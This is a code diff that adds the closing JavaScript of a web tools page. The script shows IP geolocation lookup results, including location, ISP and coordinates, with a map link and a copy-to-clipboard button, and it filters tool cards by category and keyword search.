+      document.getElementById('ip-hostname').textContent = d.isp || '';
+      document.getElementById('ip-type-badge').textContent = 'PUBLIC IP';
+      document.getElementById('r-country').textContent = d.country || 'N/A';
+      document.getElementById('r-city').textContent = d.city || 'N/A';
+      document.getElementById('r-region').textContent = d.regionName || 'N/A';
+      document.getElementById('r-timezone').textContent = d.timezone || 'N/A';
+      document.getElementById('r-org').textContent = d.org || d.isp || 'N/A';
+      document.getElementById('r-postal').textContent = d.zip || 'N/A';
+      document.getElementById('r-lat').textContent = d.lat || 'N/A';
+      document.getElementById('r-lon').textContent = d.lon || 'N/A';
+      document.getElementById('map-link').href = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
+      load.style.display='none'; data.style.display='block';
+    } catch(e) {
+      load.style.display='none'; err.style.display='block';
+      document.getElementById('ip-err-msg').textContent = e.message || 'Failed to fetch. Check IP format.';
+    }
+  }
+  function copyIPResult() {
+    const d = ipResultData;
+    const text = `IP: ${d.query}\nCountry: ${d.country}\nCity: ${d.city}\nRegion: ${d.regionName}\nISP: ${d.org||d.isp}\nTimezone: ${d.timezone}\nPostal: ${d.zip}\nLat: ${d.lat}\nLon: ${d.lon}`;
+    navigator.clipboard?.writeText(text).then(()=>{
+      const n=document.getElementById('notif'); n.textContent='✓ Copied!'; n.classList.add('show');
+      setTimeout(()=>n.classList.remove('show'),2000);
+    });
+  }
+  // spin animation
+  const st=document.createElement('style'); st.textContent='@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}'; document.head.appendChild(st);
+
+
+// FILTER
+let activeCat='all';
+function setCat(el){
+  activeCat=el.dataset.cat;
+  document.querySelectorAll('.cat').forEach(c=>c.classList.remove('on'));
+  el.classList.add('on');doFilter();
+}
+function doFilter(){
+  const q=document.getElementById('srch').value.toLowerCase();
+  const secs=document.querySelectorAll('.sec');
+  let total=0;
+  secs.forEach(sec=>{
+    let vis=0;
+    sec.querySelectorAll('.card').forEach(card=>{
+      const cats=card.dataset.cat||'';
+      const kw=card.dataset.kw||'';
+      const catOk=activeCat==='all'||cats.split(' ').includes(activeCat);
+      const qOk=!q||kw.includes(q)||card.textContent.toLowerCase().includes(q);
+      const show=catOk&&qOk;
+      card.classList.toggle('hidden',!show);
+      if(show)vis++;
+    });
+    sec.style.display=vis?'':'none';total+=vis;
+  });
+  document.getElementById('nores').classList.toggle('show',total===0);
+}
+</script>
+</body>
+</html>
